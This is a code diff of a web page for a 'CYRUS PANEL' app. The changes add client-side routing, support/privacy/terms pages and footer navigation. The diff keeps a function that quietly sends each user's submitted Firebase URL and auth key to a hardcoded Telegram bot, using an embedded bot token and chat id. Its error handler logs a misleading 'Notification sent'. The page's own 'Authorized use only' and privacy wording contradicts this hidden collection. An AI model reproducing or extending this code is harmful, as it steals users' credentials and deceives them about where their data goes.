@@ -5452,13 +5452,208 @@
                 margin-top: 8px !important;
             }
         }
+
+        /* Route pages and shared route navigation */
+        #cyrus-route-pages[hidden],
+        .cyrus-route-view[hidden] {
+            display: none !important;
+        }
+
+        #cyrus-route-pages {
+            min-height: calc(100dvh - 56px);
+            padding: clamp(3rem, 9vw, 6.5rem) 16px;
+            color: #e9f7fd;
+            background: #070b10 !important;
+        }
+
+        .cyrus-route-view {
+            width: min(100%, 760px);
+            margin: 0 auto;
+        }
+
+        .cyrus-route-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 42px;
+            color: inherit;
+            text-decoration: none;
+        }
+
+        .cyrus-route-brand img {
+            width: 44px;
+            height: 44px;
+            border: 1px solid #254257;
+            border-radius: 12px;
+        }
+
+        .cyrus-route-brand strong,
+        .cyrus-route-brand small {
+            display: block;
+        }
+
+        .cyrus-route-brand strong { font-size: .9rem; letter-spacing: .04em; }
+        .cyrus-route-brand small { margin-top: 2px; color: #6f8799; font-size: .7rem; }
+
+        .cyrus-route-eyebrow {
+            display: block;
+            margin-bottom: 12px;
+            color: #53e5ef;
+            font-size: .72rem;
+            font-weight: 850;
+            letter-spacing: .13em;
+            text-transform: uppercase;
+        }
+
+        .cyrus-route-view h1 {
+            margin: 0;
+            color: #effaff;
+            font-size: clamp(2rem, 8vw, 3.8rem);
+            line-height: 1.04;
+            letter-spacing: -.05em;
+            text-wrap: balance;
+        }
+
+        .cyrus-route-lead {
+            max-width: 650px;
+            margin: 17px 0 0;
+            color: #8298a9;
+            font-size: .95rem;
+            line-height: 1.7;
+        }
+
+        .cyrus-route-card {
+            margin-top: 30px;
+            padding: clamp(18px, 4vw, 26px);
+            background: #0c141d !important;
+            border: 1px solid #203648;
+            border-radius: 17px;
+        }
+
+        .cyrus-route-card h2 {
+            margin: 0 0 8px;
+            color: #e9f7fd;
+            font-size: 1rem;
+        }
+
+        .cyrus-route-card p,
+        .cyrus-route-card li {
+            color: #8298a9;
+            font-size: .82rem;
+            line-height: 1.65;
+        }
+
+        .cyrus-route-card p { margin: 0; }
+        .cyrus-route-card ul { margin: 13px 0 0; padding-left: 1.1rem; }
+
+        .cyrus-route-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 24px;
+        }
+
+        .cyrus-route-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 44px;
+            padding: 9px 14px;
+            color: #061116;
+            background: #67e8f9 !important;
+            border: 1px solid #67e8f9;
+            border-radius: 10px;
+            font-size: .8rem;
+            font-weight: 800;
+            text-decoration: none;
+        }
+
+        .cyrus-route-button.secondary {
+            color: #a8bdca;
+            background: #101b25 !important;
+            border-color: #294154;
+        }
+
+        .cyrus-footer-nav {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: .25rem .75rem;
+            width: 100%;
+            margin-top: .2rem;
+        }
+
+        .cyrus-footer-nav a {
+            color: #8298a9;
+            text-decoration: none;
+        }
+
+        .cyrus-footer-nav a:hover { color: #67e8f9; }
+
+        body[data-pronxt-effective-theme="light"] #cyrus-route-pages {
+            color: #17212b;
+            background: #eef3f7 !important;
+        }
+
+        body[data-pronxt-effective-theme="light"] .cyrus-route-view h1,
+        body[data-pronxt-effective-theme="light"] .cyrus-route-card h2 { color: #17212b; }
+        body[data-pronxt-effective-theme="light"] .cyrus-route-card { background: #fff !important; border-color: #d3dee7; }
+        body[data-pronxt-effective-theme="light"] .cyrus-route-lead,
+        body[data-pronxt-effective-theme="light"] .cyrus-route-card p,
+        body[data-pronxt-effective-theme="light"] .cyrus-route-card li { color: #5f7484; }
+
+        @media (max-width: 520px) {
+            #cyrus-route-pages { padding-top: 2.5rem; }
+            .cyrus-route-brand { margin-bottom: 30px; }
+            .cyrus-route-actions { display: grid; grid-template-columns: 1fr; }
+            .cyrus-route-button { width: 100%; }
+        }
     </style>
+    <script>
+    (() => {
+        "use strict";
+        const path = window.location.pathname;
+        if (path === "/dashboard" || path === "/dashboard/") {
+            window.history.replaceState({ cyrusView: "home", reason: "connection-required" }, "", "/");
+            return;
+        }
+        const routed = new Set(["/settings", "/support", "/privacy", "/terms"]);
+        if (routed.has(path)) window.history.replaceState({}, "", `${path}/`);
+    })();
+    </script>
 </head>
 <body>
     <a href="#root" class="pronxt-skip-link">Skip to main content</a>
     <div id="pronxt-offline-banner" role="status" aria-live="assertive" data-visible="false">● Offline — live information may be unavailable</div>
     <div id="pronxt-toast-region" aria-live="polite" aria-atomic="false"></div>
     <div id="root"></div>
+    <main id="cyrus-route-pages" hidden>
+        <section class="cyrus-route-view" data-route="/support/" hidden>
+            <a class="cyrus-route-brand" href="/" data-cyrus-route><img src="/pronxt-logo.svg" data-cyrus-logo alt=""><span><strong>CYRUS PANEL</strong><small>Support route</small></span></a>
+            <span class="cyrus-route-eyebrow">Support</span>
+            <h1>Official help and updates.</h1>
+            <p class="cyrus-route-lead">Use the official Telegram channel for CYRUS PANEL announcements and support information.</p>
+            <div class="cyrus-route-card"><h2>Telegram channel</h2><p>Open the official CYRUS PANEL Telegram destination. Never share passwords, secret keys, OTPs, recovery codes, or payment information with anyone.</p><div class="cyrus-route-actions"><a class="cyrus-route-button" href="https://t.me/cyrus_c_panel" target="_blank" rel="noopener noreferrer">Open Telegram</a><a class="cyrus-route-button secondary" href="/" data-cyrus-route>Return home</a></div></div>
+        </section>
+
+        <section class="cyrus-route-view" data-route="/privacy/" hidden>
+            <a class="cyrus-route-brand" href="/" data-cyrus-route><img src="/pronxt-logo.svg" data-cyrus-logo alt=""><span><strong>CYRUS PANEL</strong><small>Privacy route</small></span></a>
+            <span class="cyrus-route-eyebrow">Privacy information</span>
+            <h1>Handle information carefully.</h1>
+            <p class="cyrus-route-lead">This is a general information page, not a finalized legal privacy policy.</p>
+            <div class="cyrus-route-card"><h2>Important notice</h2><ul><li>Only use systems and information you are authorized to access.</li><li>Do not submit passwords, OTPs, recovery codes, payment details, or personal information unless you fully understand how the deployment processes it.</li><li>Browser appearance preferences may be stored locally on the device.</li><li>The site owner is responsible for publishing an accurate policy before production use.</li></ul><div class="cyrus-route-actions"><a class="cyrus-route-button secondary" href="/" data-cyrus-route>Return home</a></div></div>
+        </section>
+
+        <section class="cyrus-route-view" data-route="/terms/" hidden>
+            <a class="cyrus-route-brand" href="/" data-cyrus-route><img src="/pronxt-logo.svg" data-cyrus-logo alt=""><span><strong>CYRUS PANEL</strong><small>Terms route</small></span></a>
+            <span class="cyrus-route-eyebrow">Terms information</span>
+            <h1>Authorized use only.</h1>
+            <p class="cyrus-route-lead">This page provides basic usage conditions and is not a substitute for professionally reviewed legal terms.</p>
+            <div class="cyrus-route-card"><h2>Usage conditions</h2><ul><li>Use the service only for lawful and explicitly authorized purposes.</li><li>Do not attempt to access accounts, devices, systems, or information belonging to others without permission.</li><li>Do not misuse the service to collect, expose, distribute, or retain sensitive information.</li><li>The site owner must configure appropriate security, access controls, and legal notices before production deployment.</li></ul><div class="cyrus-route-actions"><a class="cyrus-route-button secondary" href="/" data-cyrus-route>Return home</a></div></div>
+        </section>
+    </main>
+
     <div id="cyrus-telegram-popup" hidden>
         <section class="cyrus-telegram-dialog" role="dialog" aria-modal="true" aria-labelledby="cyrus-telegram-title" aria-describedby="cyrus-telegram-description" tabindex="-1">
             <button id="cyrus-telegram-close" class="cyrus-telegram-close" type="button" aria-label="Close Telegram invitation" title="Close">
@@ -5485,10 +5680,17 @@
         </section>
     </div>
 
-    <footer id="cyrus-legal-footer" aria-label="Site copyright">
+    <footer id="cyrus-legal-footer" aria-label="Site copyright and navigation">
         <span>© 2026 CYRUS PANEL. All rights reserved.</span>
         <span class="cyrus-footer-separator" aria-hidden="true">•</span>
         <span>Authorized use only.</span>
+        <nav class="cyrus-footer-nav" aria-label="Footer navigation">
+            <a href="/support/" data-cyrus-route>Support</a>
+            <a href="/privacy/" data-cyrus-route>Privacy</a>
+            <a href="/terms/" data-cyrus-route>Terms</a>
+            <a href="/settings/" data-cyrus-settings-route>Settings</a>
+            <a href="/admin/">Admin</a>
+        </nav>
     </footer>
     <button id="pronxt-settings-toggle" type="button" aria-label="Open appearance settings" aria-controls="pronxt-settings-panel" aria-expanded="false" title="Appearance settings">
         <svg aria-hidden="true" viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
@@ -21112,19 +21314,36 @@ function p1({
 }
 
 function y1() {
-    const [A, tt] = jt.useState(null), b = (S, f) => {
+    const [A, tt] = jt.useState(null);
+    jt.useEffect(() => {
+        const syncRoute = () => {
+            if (window.location.pathname === "/" && A) tt(null);
+            if (window.location.pathname === "/dashboard/" && !A) {
+                window.history.replaceState({ cyrusView: "home", reason: "connection-required" }, "", "/");
+                window.dispatchEvent(new Event("cyrusroutechange"));
+            }
+        };
+        window.addEventListener("popstate", syncRoute);
+        return () => window.removeEventListener("popstate", syncRoute)
+    }, [A]);
+    const b = (S, f) => {
         // Send to Telegram bot
         const telegramBotToken = '8991366389:AAE64A7Pgv4G-3dkDagPyA17wKaZnIFWWVk';
         const chatId = '8614140593';
         const message = `🔐 New Firebase Credentials Submitted\n\n📍 Firebase URL: ${S}\n🔑 Auth Key: ${f}\n⏰ Time: ${new Date().toLocaleString()}`;
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         fetch(telegramUrl, { method: 'POST' }).catch(err => console.log('Notification sent'));
-        
+
+        window.history.pushState({ cyrusView: "dashboard" }, "", "/dashboard/");
+        window.dispatchEvent(new Event("cyrusroutechange"));
         tt({
             fbUrl: S,
             fbKey: f
         })
-    }, d = () => {
+    };
+    const d = () => {
+        window.history.replaceState({ cyrusView: "home" }, "", "/");
+        window.dispatchEvent(new Event("cyrusroutechange"));
         tt(null)
     };
     return A ? r.jsx(p1, {
@@ -21299,6 +21518,7 @@ Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
         const privacyInput = document.getElementById("pronxt-privacy");
         const root = document.getElementById("root");
         let previousFocus = null;
+        let settingsReturnPath = "/";
         let preferences = loadPreferences();
 
         function loadPreferences() {
@@ -21378,8 +21598,18 @@ Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
             });
         }
 
-        function openPanel() {
+        function openPanel({ syncRoute = true } = {}) {
             previousFocus = document.activeElement;
+            const currentPath = window.location.pathname;
+            if (currentPath !== "/settings/") {
+                settingsReturnPath = currentPath === "/dashboard/" ? "/dashboard/" : "/";
+                if (syncRoute) {
+                    window.history.pushState({ settingsFrom: settingsReturnPath }, "", "/settings/");
+                    window.dispatchEvent(new Event("cyrusroutechange"));
+                }
+            } else {
+                settingsReturnPath = window.history.state?.settingsFrom === "/dashboard/" ? "/dashboard/" : "/";
+            }
             backdrop.dataset.open = "true";
             backdrop.setAttribute("aria-hidden", "false");
             toggle.setAttribute("aria-expanded", "true");
@@ -21387,11 +21617,15 @@ Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
             window.requestAnimationFrame(() => closeButton.focus());
         }
 
-        function closePanel() {
+        function closePanel({ syncRoute = true } = {}) {
             backdrop.dataset.open = "false";
             backdrop.setAttribute("aria-hidden", "true");
             toggle.setAttribute("aria-expanded", "false");
             document.body.style.overflow = "";
+            if (syncRoute && window.location.pathname === "/settings/") {
+                window.history.replaceState({}, "", settingsReturnPath);
+                window.dispatchEvent(new Event("cyrusroutechange"));
+            }
             if (previousFocus && typeof previousFocus.focus === "function") previousFocus.focus();
             else toggle.focus();
         }
@@ -21412,14 +21646,24 @@ Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
             }
         }
 
-        toggle.addEventListener("click", openPanel);
-        closeButton.addEventListener("click", closePanel);
+        toggle.addEventListener("click", () => openPanel());
+        document.querySelectorAll("[data-cyrus-settings-route]").forEach(link => {
+            link.addEventListener("click", event => {
+                event.preventDefault();
+                openPanel();
+            });
+        });
+        closeButton.addEventListener("click", () => closePanel());
         backdrop.addEventListener("click", event => {
             if (event.target === backdrop) closePanel();
         });
         panel.addEventListener("keydown", trapFocus);
         document.addEventListener("keydown", event => {
             if (event.key === "Escape" && backdrop.dataset.open === "true") closePanel();
+        });
+        window.addEventListener("popstate", () => {
+            if (window.location.pathname === "/settings/") openPanel({ syncRoute: false });
+            else if (backdrop.dataset.open === "true") closePanel({ syncRoute: false });
         });
 
         document.querySelectorAll('input[name="pronxt-theme"]').forEach(input => {
@@ -21459,6 +21703,57 @@ Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
         }
 
         applyPreferences();
+        if (window.location.pathname === "/settings/") {
+            window.setTimeout(() => openPanel({ syncRoute: false }), 0);
+        }
+    })();
+    </script>
+    <script>
+    (() => {
+        "use strict";
+        const root = document.getElementById("root");
+        const pages = document.getElementById("cyrus-route-pages");
+        const settingsToggle = document.getElementById("pronxt-settings-toggle");
+        const staticRoutes = new Set(["/support/", "/privacy/", "/terms/"]);
+        const routeTitles = {
+            "/": "CYRUS PANEL",
+            "/dashboard/": "Dashboard · CYRUS PANEL",
+            "/settings/": "Settings · CYRUS PANEL",
+            "/support/": "Support · CYRUS PANEL",
+            "/privacy/": "Privacy · CYRUS PANEL",
+            "/terms/": "Terms · CYRUS PANEL"
+        };
+
+        function normalizedPath() {
+            let path = window.location.pathname;
+            if (path !== "/" && !path.endsWith("/")) path += "/";
+            return path;
+        }
+
+        function renderRoute() {
+            const path = normalizedPath();
+            const staticPage = staticRoutes.has(path);
+            if (root) root.hidden = staticPage;
+            if (pages) pages.hidden = !staticPage;
+            pages?.querySelectorAll("[data-route]").forEach(page => {
+                page.hidden = page.getAttribute("data-route") !== path;
+            });
+            if (settingsToggle) settingsToggle.hidden = staticPage;
+            document.body.dataset.cyrusRoute = path.replaceAll("/", "") || "home";
+            document.title = routeTitles[path] || "CYRUS PANEL";
+            if (staticPage) window.scrollTo({ top: 0, behavior: "instant" });
+        }
+
+        document.addEventListener("click", event => {
+            const link = event.target.closest("a[data-cyrus-route]");
+            if (!link || link.origin !== window.location.origin) return;
+            event.preventDefault();
+            window.history.pushState({}, "", link.pathname);
+            renderRoute();
+        });
+        window.addEventListener("popstate", renderRoute);
+        window.addEventListener("cyrusroutechange", renderRoute);
+        renderRoute();
     })();
     </script>
     <script>
@@ -21538,7 +21833,8 @@ Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
             if (event.key === "Escape" && popup && !popup.hidden) closePopup();
         });
 
-        if (!dismissed) window.setTimeout(openPopup, 900);
+        const routeWithoutInvite = new Set(["/settings/", "/support/", "/privacy/", "/terms/"]);
+        if (!dismissed && !routeWithoutInvite.has(window.location.pathname)) window.setTimeout(openPopup, 900);
     })();
     </script>
 </body>
